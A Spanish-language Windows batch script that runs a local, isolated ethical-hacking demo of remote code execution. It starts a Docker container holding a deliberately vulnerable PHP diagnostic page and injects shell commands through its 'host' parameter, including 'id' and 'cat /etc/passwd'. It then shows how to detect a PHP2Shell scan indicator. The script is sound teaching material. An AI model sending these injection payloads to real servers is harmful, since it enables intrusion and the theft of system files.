@echo off
title Ataque etico controlado - que es RCE
cd /d "%~dp0"
set NAME=php2shell-ataque
set IMG=php:8.2-apache

where docker >nul 2>&1 || (echo  No encuentro Docker. Abre Docker Desktop. & pause & exit /b)
docker info >nul 2>&1 || (echo  Docker no responde. Abre Docker Desktop y espera. & pause & exit /b)

cls
echo.
echo   ATAQUE ETICO CONTROLADO  -  Que es "ejecucion remota de codigo"
echo   ================================================================
echo   Todo corre en TU laptop, en un contenedor aislado, contra una app
echo   de juguete vulnerable a proposito. NO es el exploit de PHP2Shell.
echo.
docker rm -f %NAME% >nul 2>&1
docker run -d --name %NAME% -p 8081:80 -v "%cd%\app":/var/www/html:ro %IMG% >nul
echo   App de juguete arriba en http://localhost:8081
start "" http://localhost:8081
echo.
pause

:: ---------- USO NORMAL ----------
cls
echo.
echo   === 1 de 4 - Uso NORMAL : un panel de diagnostico de red ===
echo.
echo   $ curl "http://localhost:8081/diagnostico.php?host=localhost"
curl -s "http://localhost:8081/diagnostico.php?host=localhost"
echo.
echo   ^>^> Se ve inofensivo: le das un host y lo "diagnostica".
echo.
pause

:: ---------- EL ATAQUE ----------
cls
echo.
echo   === 2 de 4 - El ATAQUE : encadeno un comando con ; ===
echo.
echo   $ curl "http://localhost:8081/diagnostico.php?host=localhost;id"
curl -s "http://localhost:8081/diagnostico.php?host=localhost;id"
echo.
echo   ^>^> Una sola peticion web, y ya corro comandos como el usuario del servidor.
echo.
pause

:: ---------- HASTA DONDE LLEGA ----------
cls
echo.
echo   === 3 de 4 - Hasta donde llega : leo archivos del servidor ===
echo.
echo   $ curl "http://localhost:8081/diagnostico.php?host=localhost;hostname;cat%%20/etc/passwd"
curl -s "http://localhost:8081/diagnostico.php?host=localhost;hostname;cat%%20/etc/passwd"
echo.
echo   ^>^> Esto es RCE. PHP2Shell logra LO MISMO, pero por un bug de memoria,
echo      no por un system() obvio. Por eso el WAF y la revision de codigo no lo vieron.
echo.
pause

:: ---------- VISTA DEL DEFENSOR ----------
cls
echo.
echo   === 4 de 4 - La vista del DEFENSOR : como se ve y se detecta el escaneo real ===
echo.
echo   El indicador de PHP2Shell: POST multipart con el campo PHP_SESSION_UPLOAD_PROGRESS.
echo.
echo   $ findstr /i "PHP_SESSION_UPLOAD_PROGRESS" muestra-escaneo.txt
findstr /i "PHP_SESSION_UPLOAD_PROGRESS" muestra-escaneo.txt
echo.
echo   ^>^> Eso es lo que buscas en tu WAF, en una captura o en un honeypot.
echo.
pause

:: ---------- LIMPIEZA ----------
cls
echo.
choice /c SN /m "  Borro el contenedor del ataque"
if errorlevel 2 goto fin
docker rm -f %NAME% >nul 2>&1
echo   Listo, contenedor borrado.
:fin
echo.
pause
